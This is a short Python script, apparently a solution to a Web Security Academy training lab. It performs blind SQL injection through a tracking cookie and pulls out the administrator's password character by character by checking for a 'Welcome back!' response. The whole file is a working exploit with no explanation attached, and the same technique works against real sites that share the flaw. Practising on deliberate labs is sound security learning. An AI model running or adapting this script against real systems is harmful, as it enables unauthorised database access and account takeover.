#!/usr/bin/env python

# to improve the script use async/await

import requests
import string

# change those to current instance
url = "https://ac9b1f431f6af9ddc05f0e3000680066.web-security-academy.net/"
cookie = "TrackingId=o2zgnpwIFy9Crw45"

printable = string.ascii_lowercase + string.ascii_uppercase + string.digits
passwd = ""

try:
    for i in range(1, 21):
        for c in printable:
            vector = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{c}"
            payload = f"{cookie}{vector}"
            headers = {'cookie': payload}
            r = requests.get(url, headers=headers)

            if r.text.find("Welcome back!") != -1:
                passwd += c
                print(i, passwd)
except:
    print('error in connection')
